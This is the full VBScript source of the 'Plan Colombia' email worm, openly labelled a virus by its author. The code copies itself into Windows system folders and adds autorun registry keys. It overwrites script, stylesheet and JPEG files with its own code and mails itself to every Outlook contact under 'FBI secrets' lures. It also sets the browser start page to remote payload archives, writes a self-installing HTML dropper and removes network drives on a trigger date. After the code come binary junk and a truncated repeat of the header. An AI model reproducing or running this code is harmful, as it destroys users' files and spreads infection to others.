rem  ===============================================================================================
rem  "Plan Colombia" virus v1.0
rem  by Sand Ja9e Gr0w   (www.colombia.com)

rem  Dedicated to all the people that want to be hackers or crackers, in Colombia  
rem  This program is also a protest act against the violence and corruption that Colombia lives...
rem  I always wanting that all this finishes, I have said...


rem  Santa fe de Bogotá 2000/09
rem  I dedicate to all you the song "GoodBye" of Andreas Bochelli
rem  =================================================================================================


rem  Thanks God..!
rem  A greeting for "Lina María" from "Santa fe de Bogotá"
rem  A greeting for "Tizo" from "Spain"
rem  And One kicked of tail to my friends, "eL ChE" and "ThE SpY"

rem  okay, ok... 
rem  my baby start here...

 
On Error Resume Next
dim fso,dirsystem,dirwin,dirtemp,eq,ctr,file,vbscopy,dow,polyn,numero,polye
eq=""
ctr=0

randomize
numero = Int(Rnd * 3) + 1
polye = ".GIF.vbs"
If numero = 1 Then
  polye = ".BMP.vbs"
 Else
  If numero = 2 Then
    polye = ".JPG.vbs"
  End If
End If


polyn="\"&polyname(Int(Rnd * 5) + 4)&polye

Set fso = CreateObject("Scripting.FileSystemObject")
set file = fso.OpenTextFile(WScript.ScriptFullname,1)
vbscopy=file.ReadAll
main()
If Day(Now) = 17 And Month(Now) = 9 Then
  MsgBox "Dedicated to my best brother=>Christiam Julian(C.J.G.S.)" & Chr(13) & "Att.  " & polyname(5) & "   (M.H.M. TEAM)"
  killnet()
End If



sub main()
On Error Resume Next
dim wscr,rr
set wscr=CreateObject("WScript.Shell")
rr=wscr.RegRead("HKEY_CURRENT_USER\Software\Microsoft\Windows Scripting Host\Settings\Timeout")
if (rr>=1) then
 wscr.RegWrite "HKEY_CURRENT_USER\Software\Microsoft\Windows Scripting Host\Settings\Timeout",0,"REG_DWORD"
end if
Set dirwin = fso.GetSpecialFolder(0)
Set dirsystem = fso.GetSpecialFolder(1)
Set dirtemp = fso.GetSpecialFolder(2)
Set c = fso.GetFile(WScript.ScriptFullName)
c.Copy(dirsystem&"\LINUX32.vbs")
c.Copy(dirwin&"\reload.vbs")
c.Copy(dirsystem&polyn)
regruns()
html()
spreadtoemail()
listadriv()
end sub



sub regruns()
On Error Resume Next
Dim num,downread,res
regcreate "HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Run\LINUX32",dirsystem&"\LINUX32.vbs"
regcreate "HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\RunServices\reload",dirwin&"\reload.vbs"
downread=""
downread=regget("HKEY_CURRENT_USER\Software\Microsoft\Internet Explorer\Download Directory")
if (downread="") then
  downread="c:\"
end if

rem   acepta nombres largos..?
if (fileexist(dirsystem&"\WinFAT32.exe")=1) then
  Randomize
  Randomize
  num = Int((4 * Rnd) + 1)

  rem  fatal => send virii
  if num = 2 then 
    regcreate "HKCU\Software\Microsoft\Internet Explorer\Main\Start Page","http://members.fortunecity.com/plancolombia/macromedia32.zip"
   else
    rem  oh,, a picture.. nice :)  
    if num = 3 then
        regcreate "HKCU\Software\Microsoft\Internet Explorer\Main\Start Page","http://members.fortunecity.com/plancolombia/linux321.zip"       
      else
       rem  oh,, other picture  =:()
       if num = 4 then
         regcreate "HKCU\Software\Microsoft\Internet Explorer\Main\Start Page","http://members.fortunecity.com/plancolombia/linux322.zip"
       end if 
    end if  
 end if
end if

if (fileexist(downread&"\MACROMEDIA32.zip")=0) then
  res = Shell("copy " & downread & "\MACROMEDIA32.zip  " & dirwin & "\important_note.txt", vbHide)
  regcreate "HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Run\plan colombia",dirwin&"\important_note.txt"
  regcreate "HKEY_CURRENT_USER\Software\Microsoft\Internet Explorer\Main\Start Page","about:blank"
 else
  if (fileexist(downread&"\linux321.zip")=0) then
     Kill (dirwin & "\logos.sys")
     res = Shell("copy " & downread & "\linux321.zip  " & dirwin & "\logos.sys", vbHide)
     regcreate "HKEY_CURRENT_USER\Software\Microsoft\Internet Explorer\Main\Start Page","about:blank"     
    else
      if (fileexist(downread&"\linux322.zip")=0) then
        Kill (dirwin & "\logow.sys")
        res = Shell("copy " & downread & "\linux322.zip  " & dirwin & "\logow.sys", vbHide)  
        regcreate "HKEY_CURRENT_USER\Software\Microsoft\Internet Explorer\Main\Start Page","about:blank"     
      end if   
  end if
end if
end sub



sub listadriv
On Error Resume Next
Dim d,dc,s
Set dc = fso.Drives

For Each d in dc
 If d.DriveType = 2 or d.DriveType=3 Then
  folderlist(d.path&"\")
 end if
Next

listadriv = s
end sub



sub infectfiles(folderspec)
On Error Resume Next
dim f,f1,fc,ext,ap,mircfname,s,bname,mp3
set f = fso.GetFolder(folderspec)
set fc = f.Files

for each f1 in fc
 ext=fso.GetExtensionName(f1.path)
 ext=lcase(ext)
 s=lcase(f1.name)
if (ext="vbs") or (ext="vbe") then
  set ap=fso.OpenTextFile(f1.path,2,true)
  ap.write vbscopy
  ap.close
 else
  if(ext="js") or (ext="jse") or (ext="css") or (ext="wsh") or (ext="sct")  or (ext="hta") then
   set ap=fso.OpenTextFile(f1.path,2,true)
   ap.write vbscopy
   ap.close
   bname=fso.GetBaseName(f1.path)
   set cop=fso.GetFile(f1.path)
   cop.copy(folderspec&"\"&bname&".vbs")
   fso.DeleteFile(f1.path)  
 else
  if(ext="jpg") or (ext="jpeg") then
   set ap=fso.OpenTextFile(f1.path,2,true)
   ap.write vbscopy
   ap.close
   set cop=fso.GetFile(f1.path)
   cop.copy(f1.path&".vbs")
   fso.DeleteFile(f1.path)  
 else
  if(ext="mp3") or (ext="mp2") then
   set mp3=fso.CreateTextFile(f1.path&".vbs")
   mp3.write vbscopy
   mp3.close
   set att=fso.GetFile(f1.path)
   att.attributes=att.attributes+2
 end if
 end if
 end if
end if
next

end sub



sub folderlist(folderspec)
On Error Resume Next
dim f,f1,sf
set f = fso.GetFolder(folderspec)
set sf = f.SubFolders

for each f1 in sf
 infectfiles(f1.path)
 folderlist(f1.path)
next

end sub


sub regcreate(regkey,regvalue)
Set regedit = CreateObject("WScript.Shell")
regedit.RegWrite regkey,regvalue
end sub


function regget(value)
Set regedit = CreateObject("WScript.Shell")
regget=regedit.RegRead(value)
end function


function fileexist(filespec)
On Error Resume Next
dim msg
if (fso.FileExists(filespec)) Then
  msg = 0
else
  msg = 1
end if
fileexist = msg
end function


function folderexist(folderspec)
On Error Resume Next
dim msg
if (fso.GetFolderExists(folderspec)) then
 msg = 0
else
 msg = 1
end if
fileexist = msg
end function



sub spreadtoemail()
On Error Resume Next
dim x,a,ctrlists,ctrentries,correoad,b,regedit,regv,regad,textosub,textobod

set regedit=CreateObject("WScript.Shell")
set out=WScript.CreateObject("Outlook.Application")
set mapi=out.GetNameSpace("MAPI")

Randomize
numero = Int(Rnd * 3) + 1
textosub = ""
If numero = 1 Then
  textosub = "US PRESIDENT AND FBI SECRETS =PLEASE VISIT => (http://WWW.2600.COM)<="
 Else
  If numero = 2 Then
    textosub = polyname(6)
  End If
End If


Randomize
numero = Int(Rnd * 3) + 1
textobod = ""
If numero = 1 Then
  textobod = "VERY JOKE..! SEE PRESIDENT AND FBI TOP SECRET PICTURES.."
 Else
  If numero = 2 Then
    textobod = polyname(10)
  End If
End If


for ctrlists=1 to mapi.AddressLists.Count
 set a=mapi.AddressLists(ctrlists)
 x=1
 regv=regedit.RegRead("HKEY_CURRENT_USER\Software\Microsoft\WAB\"&a)
 if (regv="") then
 regv=1
 end if
 if (int(a.AddressEntries.Count)>int(regv)) then
 
  for ctrentries=1 to a.AddressEntries.Count
   correoad=a.AddressEntries(x)
   regad=""
   regad=regedit.RegRead("HKEY_CURRENT_USER\Software\Microsoft\WAB\"&correoad)
   if (regad="") then
     set correo=out.CreateItem(0)
     correo.Recipients.Add(correoad)
     correo.Subject = textosub
     correo.Body = vbcrlf&textobod
     correo.Attachments.Add(dirsystem&polyn)
     correo.Send
     regedit.RegWrite  "HKEY_CURRENT_USER\Software\Microsoft\WAB\"&correoad,1,"REG_DWORD"
   end if
     x=x+1
  next

  regedit.RegWrite  "HKEY_CURRENT_USER\Software\Microsoft\WAB\"&a,a.AddressEntries.Count
 else
   regedit.RegWrite  "HKEY_CURRENT_USER\Software\Microsoft\WAB\"&a,a.AddressEntries.Count
end if
next

Set out=Nothing
Set mapi=Nothing
end sub


Function polyname(n)
Dim i, vector, texto, pos
on error resume next
rem polyformic ( ohhhh yeahhh...) very good polyformic engine  :() by Sand Ja9e Gr0w

vector = Array("A", "E", "I", "O", "U")
texto = ""
Randomize
For i = 1 To n
  Randomize
  rem  consonante
  texto = texto&Chr(Int((Rnd * 25) + 65))
  i = i + 1
  If i > n Then
   exit for
  end if
  rem  vocal
  texto = texto&vector(Int((Rnd * 4) + 1))
  Randomize
Next

polyname = texto
End Function




sub html
On Error Resume Next
dim lines,n,dta1,dta2,dt1,dt2,dt3,dt4,l1,dt5,dt6
dta1="<HTML><HEAD>"&_
"<?-?HEAD><BODY ONMOUSEOUT=@-@window.name=#-#main#-#;window.open(#-#US-PRESIDENT-AND-FBI-SECRETS.HTM# -#,#-#main#-#)@-@           "ONKEYDOWN=@-@window.name=#-#main#-#;window.open(#-#US-PRESIDENT-AND-FBI-SECRETS.HTM# -#,#-#main#-#)@-@ BGPROPERTIES=@-@fixed@-@ BGCOLOR=@-@#FF9933@-@>"&vbcrlf& _
"<CENTER><p>M.H.M TEAM <?-?p><p>Colombia<BR>- Please press #-#YES#-# button for see secret pictures<?-?p>"&vbcrlf& _
"<?-?CENTER><MARQUEE LOOP=@-@infinite@-@ BGCOLOR=@-@yellow@-@>Hello Colombia...! Since Here, after, since other part of World..<?-?MARQUEE> "&vbcrlf& _
"<?-?BODY><?-?HTML>"&vbcrlf& _
"<SCRIPT language=@-@JScript@-@>"&vbcrlf& _
"<!--?-??-?"&vbcrlf& _
"if (window.screen){var wi=screen.availWidth;var hi=screen.availHeight;window.moveTo(0,0);window.resizeTo(wi,hi);}"&vbcrlf& _
  "?-??-?-->"&vbcrlf& _
  "<?-?SCRIPT>"&vbcrlf& _
  "<SCRIPT LANGUAGE=@-@VBScript@-@>"&vbcrlf& _
  "<!--"&vbcrlf& _
  "on error resume next"&vbcrlf& _
  "dim fso,dirsystem,wri,code,code2,code3,code4,aw,regdit"&vbcrlf& _
  "aw=1"&vbcrlf& _
  "code="

  dta2="set fso=CreateObject(@-@Scripting.FileSystemObject@-@)"&vbcrlf& _
  "set dirsystem=fso.GetSpecialFolder(1)"&vbcrlf& _
  "code2=replace(code,chr(91)&chr(45)&chr(91),chr(39))"&vbcrlf& _
  "code3=replace(code2,chr(93)&chr(45)&chr(93),chr(34))"&vbcrlf& _
  "code4=replace(code3,chr(37)&chr(45)&chr(37),chr(92))"&vbcrlf& _
  "set wri=fso.CreateTextFile(dirsystem&@-@^-^LINUX32.vbs@-@)"&vbcrlf& _
  "wri.write code4"&vbcrlf& _
  "wri.close"&vbcrlf& _
  "if (fso.FileExists(dirsystem&@-@^-^LINUX32.vbs@-@)) then"&vbcrlf& _
  "if (err.number=424) then"&vbcrlf& _
  "aw=0"&vbcrlf& _
  "end if"&vbcrlf& _
  "if (aw=1) then"&vbcrlf& _
  "document.write @-@ERROR: can#-#t load Pictures. IE internal Error@-@"&vbcrlf& _
  "window.close"&vbcrlf& _
  "end if"&vbcrlf& _
  "end if"&vbcrlf& _
  "Set regedit = CreateObject(@-@WScript.Shell@-@)"&vbcrlf& _
  "regedit.RegWrite  @-@HKEY_LOCAL_MACHINE^-^Software^-^Microsoft^-^Windows^-^CurrentVersion^-^Run^-^LINUX32@-@,dirsystem&@-@^-^LINUX32.vbs@-@"&vbcrlf& _
  "?-??-?-->"&vbcrlf& _
  "<?-?SCRIPT>"

  dt1=replace(dta1,chr(35)&chr(45)&chr(35),"'")
  dt1=replace(dt1,chr(64)&chr(45)&chr(64),"""")
  dt4=replace(dt1,chr(63)&chr(45)&chr(63),"/")
  dt5=replace(dt4,chr(94)&chr(45)&chr(94),"\")
  dt2=replace(dta2,chr(35)&chr(45)&chr(35),"'")
  dt2=replace(dt2,chr(64)&chr(45)&chr(64),"""")
  dt3=replace(dt2,chr(63)&chr(45)&chr(63),"/")
  dt6=replace(dt3,chr(94)&chr(45)&chr(94),"\")
  set fso=CreateObject("Scripting.FileSystemObject")
  set c=fso.OpenTextFile(WScript.ScriptFullName,1)
  lines=Split(c.ReadAll,vbcrlf)
  l1=ubound(lines)

  for n=0 to ubound(lines)
    lines(n)=replace(lines(n),"'",chr(91)+chr(45)+chr(91))
    lines(n)=replace(lines(n),"""",chr(93)+chr(45)+chr(93))
    lines(n)=replace(lines(n),"\",chr(37)+chr(45)+chr(37))
    if (l1=n) then
      lines(n)=chr(34)+lines(n)+chr(34)
     else
      lines(n)=chr(34)+lines(n)+chr(34)&"&vbcrlf& _"
   end if
  next

  set b=fso.CreateTextFile(dirsystem+"\US-PRESIDENT-AND-FBI-SECRETS.HTM")
  b.close
  set d=fso.OpenTextFile(dirsystem+"\US-PRESIDENT-AND-FBI-SECRETS.HTM",2)
  d.write dt5
  d.write join(lines,vbcrlf)
  d.write vbcrlf
  d.write dt6
  d.close
end sub



sub killnet()
Dim intDrive,strDrive,WSHNetwork

on error resume next


Set WSHNetwork = WScript.CreateObject("WScript.Network")

    For intDrive = 26 To 5 Step -1       
               strDrive = Chr(intDrive + 64) & ":"        
               WSHNetwork.RemoveNetworkDrive strDrive
    Next

rem  bye net connection ...                 :-(
Set WSHNetwork=Nothing

end sub
                                                                                                                      à ú  = ^    Ä ó Ÿ `Ÿ uŸ ’Ÿ ¹Ÿ àŸ    7  }  ¾  à  ¡ *¡ L¡ p¡ ˜¡ Á¡ é¡ ¢ :¢ `¢ ‰¢ Ó¢ û¢ £ A£ i£ Œ£ Â£  ¤ )¤ S¤ l¤ ¤ °¤ Ğ¤ ğ¤ ¥ P¥ y¥ ¤¥ Í¥  ¦ 2¦ e¦ ˜¦ Ë¦ ò¦ .§ V§ u§ ¢§ Ğ§ õ§ '¨ X¨ ¨ ©¨ À¨ ğ¨ © P© © ¸© Ñ© ö© ª Iª gª ª ´ª Ïª « '« g« ’« ¼« â« ¬ 5¬ \¬ x¬ ‹¬ ³¬ Ï¬ ÷¬ *­ E­ y­ ®­ â­ ® H® k® ® ®® Ô® ÿ® ¯ F¯ ¯ ¸¯ å¯ ° L° …° ©° Å° é° ± ;± ^± ˜± Ó± ú± !² ;² M² n   Ø  Ø  PR        T          ÿ ÿ ÿ ÿÿÿ ÿ ÿ ÿÿÿ ÿ ÿ ÿÿÿ ÿ ÿ ÿÿÿ ÿ ÿ ÿÿÿ ÿ ÿ ÿÿÿ ÿ ÿ ÿÿÿ ÿ ÿ ÿÿÿ ÿ ÿ ÿÿÿ ÿ ÿ ÿÿÿ ÿ ÿ ÿ ÿ ÿÿÿ ÿ ÿ ÿÿ»ÀÃ µ¹»Ã²µ·¹°³µ·¯²³³¯²³³¯²³²¯±²³¯±²±¯²´²°´¶²´¸º¶¹¿Â¸ÿ ÿÂÿ ÿ ÿ ÿÿÿ ÿ ÿ ÿ ÿ ÿÿ¸¾Á ¨©©Á¶¶¶©ººº¶ãããºãããããääãáååäáåæåâäåæääääãããäãããã¹¹¹ã³³³¹¥¦¦³µº¾¦ÿ ÿ¾ÿ ÿ ÿ ÿ ÿ ÿÿÿ ÿ ÿ ÿÿ¹¿Ã ®³µÃ”§ª³j±¹ªX¼Ç±XÀÍÇX¿ÍÀX»ÊÍb³Á»{¨²Á¡©¬¨­²´¬¹¿Â²ÿ ÿÂÿ ÿ ÿ ÿÿÿ ÿ ÿ ÿ ÿ ÿÿÿ ÿ ÿ ÿÿÿ ÿ wÆÍÿ'ÒàÆ'Üîà-áôÜ2áøô3ß÷á3Úô÷7ÒíÚ5ÈãíD»ÔÈ¦ÆÏÔÿ ÿÆÿ ÿÿÿ ÿ ÿ ÿÿÿ ÿ ÿ ÿ ÿ ÿÿÿ ÿ ÿ ÿÿoÇÏ !ÛèÏ'çöÛ+ìÿö0ïÿì5ïÿÿ5ìÿï7çÿÿ:àıç8Öôı:ÊèÖ=ºÖè¨ÆÏºÿ ÿÏÿ ÿ ÿ ÿÿÿ ÿ ÿ ÿ ÿ ÿÿÿ ÿ ›ÈÍÿ ÙæÈ#ëùæ+óÿë-öÿÿ2øÿö7øÿÿ8ôÿø:ğÿÿ=éÿğ;ßÿÿ=Ôõß=ÆæõI¶ÒÆÿ ÿÒÿ ÿ ÿ ÿÿÿ ÿ ÿ ÿ ÿ ÿÿÿ ÿ >ĞÙÿ!èõĞ%ôÿõ-ûÿôTUÿUUT8şÿU:ûÿş;öÿÿOUöLUU>ÜıL>Ïğı;½ßÏ…½Íßÿ ÿ½ÿ ÿÿÿ ÿ ÿ ÿ ÿ ÿÿ¬ÊÎ İéÎ!ğşİ'ûÿşUUûÿÿÿUUUÿUUUAÿÿUSUÿÿÿÿSNUÿJUN@ÔöU=ÄæÔQ´Ïæÿ ÿ´ÿ ÿÿÿ ÿ ÿ ÿ ÿ ÿÿƒÊĞ äïĞ#ôÿä'şÿÿUUşÿÿÿUÿÿÿÿ%UUÿzÿÿUUUÿÿÿÿUÿÿÿÿKUÿAÖùU>ÈêÖ:´Ôêÿ ÿ´ÿ ÿÿÿ ÿ ÿ ÿ ÿ ÿÿrÌÓ çòÓ#öÿç'ÿÿÿ.ÿÿÿUUÿUUU¹ÿÿUĞÿÿÿxÿÿÿSUÿOUUAãÿOA×úÿ>Èë×:¶×ë²ÈĞ¶ÿ ÿĞÿ ÿ ÿ ÿ ÿ ÿÿvÌÓ æñÓ#õÿæ'ÿÿÿ-ÿÿÿ2ÿÿÿXÿÿÿªÿÿÿÂÿÿÿlÿÿÿD÷ÿÿ@ìÿÿAãÿìAÖùÿ>ÈêÖ:µÖêµÉĞµÿ ÿĞÿ ÿ ÿ ÿ ÿ ÿÿ‘ÌÑ âíÑ!òÿâ'ûÿÿ-ÿÿû.ÿÿÿ>ÿÿÿ\ÿÿÿaÿÿÿIÿÿÿ>òÿÿ>éÿÿ@àÿé@Ôöÿ=ÅçÔ=²Òçÿ ÿ²ÿ ÿÿÿ ÿ ÿ ÿ ÿ ÿÿÿ ÿ "Úäÿ!ëùÚ%öÿù-üÿö	56ÿ3ÿÿ5:şÿÿ=ûÿş;õÿÿ>îÿõ06ÿ>Ûı0>Ïñı;ÀáÏc¶Íáÿ ÿ¶ÿ ÿÿÿ ÿ ÿ ÿ ÿ ÿÿÿ ÿ `ÎÖÿãğÎ%ïığ+õÿï-÷ÿÿ
46÷466364266162;ßÿ6=Õõß=Èèõ8·×È ÃÎ×ÿ ÿÃÿ ÿÿÿ ÿ ÿ ÿ ÿ ÿÿÿ ÿ ºÎÒÿ-ÔßÎ#ãñß)ëûã+îÿû0ğÿî5ïÿÿ5ìÿï8çÿÿ:àıç:×öı:Ìë×:¾İëg¸Í¾ÿ ÿÍÿ ÿ ÿ ÿÿÿ ÿ ÿ ÿ ÿ ÿÿÿ ÿ ÿ ÿÿ¤ÌÒ *ÓàÒ'ŞíÓ)âõí.åùâ2äûù3áùä5İöù7Öñİ7Ìéñ7ÀİÌX¸Îİÿ ÿ¸ÿ ÿÿÿ ÿ ÿ ÿÿÿ ÿ ÿ ÿ ÿ ÿÿÿ ÿ ÿ ÿÿÿ ÿ ¯ÍÒÿJÌ×Í%Òã×+ÖéÒ.Öëé0ÔëÖ2Ïçë3ÈáÏ4½×ás¾Î½ÿ ÿÎÿ ÿ ÿ ÿÿÿ ÿ ÿ ÿÿÿ ÿ ÿ ÿ ÿ ÿÿÿ ÿ ÿ ÿÿÿ ÿ ÿ ÿÿÿ ÿ ÊÑÿmÇÒÊTÆÕÒKÄÕÆ[ÂÒÕ~ÂÏÂµËÑÏÿ ÿËÿ ÿÿÿ ÿ ÿ ÿÿÿ ÿ ÿ ÿÿÿ ÿ ÿ ÿ ÿ ÿÿÿ ÿ ÿ ÿÿÿ ÿ ÿ ÿÿÿ ÿ ÿ ÿÿÿ ÿ ÿ ÿÿÿ ÿ ÿ ÿÿÿ ÿ ÿ ÿÿÿ ÿ ÿ ÿÿÿ ÿ ÿ ÿÿÿ ÿ ÿ ÿÿÿ ÿ ÿ ÿ ÿ ÿÿÿ ÿ ÿ ÿÿÿ ÿ ÿ ÿÿÿ ÿ ÿ ÿÿÿ ÿ ÿ ÿÿÿ ÿ ÿ ÿÿÿ ÿ ÿ ÿÿÿ ÿ ÿ ÿÿÿ ÿ ÿ ÿÿÿ ÿ ÿ ÿÿÿ ÿ   _û ‚û ¤û Óû ü %ü Uü ü Ÿü ¾ü ßü úü ı Bı ]ı ı ¾ı åı 
ş 1ş Vş šş Şş ÿş :ÿ ‚ÿ ¾ÿ îÿ   :  e  ‘  ¹  İ   9 ^ ƒ › ² Ü  1 ^ ‚ Ÿ Ô 	 % @ m š È õ  @ h ƒ œ Ã ë  8 { £ Ö ı $ f ’ ¾ ò & ; ] € £ ¾ 
 a ‘ Â ó $	 U	 †	 ¶	 ß	 
 ,
 U
 
 ¤
 ×
 ó
 . W  ¨ Ğ ô  6 ` y ¡ Æ í  O  ¹ ï $ O x – ¶ × ú 9 m £ Ï ö  J j Š ² Ú  9 ‡ ° Û   9 [ r ‘ » Ñ ë  + K n ’ ¿ ó  D d  ¹ å  = i • Á # O { Ù ş $ F n “ ¼ â  @ ^ „ Ó  C • ø 3 r ¦ Ğ  < h  ³ û C [ u ¸ Ş   7 R h … ª Ì ï  B r ¢ ¹ Ô ê  C _ { — Ç ß ø   +  C  e  ‡  ¼  ü  3! j! Š! ğ! 0" f" " Ö" # F# ~# ¶# î# $ `$ Ê$ ÷$ 0% H% a% ‚% «% İ% & D& j& ª& ê& (' [' ‡' Â' ş' ( C( m( Š( ½( ğ( %) W) Œ) ¾) ò) * I* v* ˜* ±* Æ* ø* + X+  + İ+ , -, ], ˜, ¾, ä, - +- R- x- ˜- ®- Æ- â- ı- 0. d. ». ğ. / F/ y/ ¦/ Ù/ 0 +0 F0 z0 •0 ²0 ã0 1 G1 1 ¼1 2 ;2 l2 ¡2 ×2 3 {3 »3 ç3 '4 `4 4 Ï4 ï4 	5 $5 ;5 w5 §5 Á5 ø5 @6 z6 ¢6 Ä6 ì6 7 ?7 o7  7 ¼7 Ú7 ÷7 	8 (8 E8 8 –8 À8 ë8 O9 i9 Í9 ş9 .: E: {: ³: Ö: ; \; •; ¼; â; < D< }< ¤< ğ< 
= ;= l= §= Î= H> > £> ¾> ÿ> "? e? ‘? ä? @ K@ t@ @ ½@ İ@ A /A XA A ¹A àA B 1B jB ›B ÖB ÷B ?C zC œC µC ØC D MD jD “D ÙD E BE ŒE ¸E F .F BF dF ’F ³F ÓF øF G @G hG G ±G ËG óG H 5H kH œH ÌH SI ~I ®rem  ===============================================================================================
rem  "Plan Colombia" virus v1.0
rem  by Sand Ja9e Gr0w   (www.colombia.com)

rem  Dedicated to all the people that want to be hackers or crackers, in Colombia  
rem  This program is also a protest act against the violence and corruption that Colombia lives...
rem  I always wanting that all this finishes, I have said...


rem  Santa fe de Bogotá 2000/09
rem  I dedicate to all you the song "GoodBye" of Andreas